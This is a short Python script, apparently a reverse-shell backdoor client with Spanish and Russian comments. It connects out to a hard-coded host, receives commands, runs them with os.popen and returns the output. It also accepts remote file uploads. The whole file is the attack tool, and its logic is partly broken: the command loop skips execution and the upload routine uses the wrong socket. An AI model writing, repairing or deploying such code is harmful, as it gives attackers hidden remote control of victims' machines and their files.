import socket
import os
import time

sock = socket.socket()
sock.connect(("192.168.1.47", 10000))

def recvfile():
    i = 1
    f = open(sock.recv(1024), 'wb')  # Open in binary
    i = i + 1
    while True:
        # Recibimos y escribimos en el fichero
        l = sock.recv(1024)
        while (l):
            f.write(l)
            l = sock.recv(1024)
def main():
    while True:
        try:
            sock = socket.socket()
            sock.connect(("0.0.0.0", 9898))
            while True:
                try:
                    data = sock.recv(1024).decode()  # получаем команду
                    if data == "uploadfile":
                        recvfile()
                    else:
                        continue
                    aa = os.popen(data)
                    result = aa.read()
                    if len(result) == 0:
                        sock.send(" ".encode())  # в случае, если рзультат
                        # пустой, отправляем пробел
                    else:
                        sock.send(result.encode())  # отправляем результат
                except:
                    break
        except:
            time.sleep(10)
            continue
main()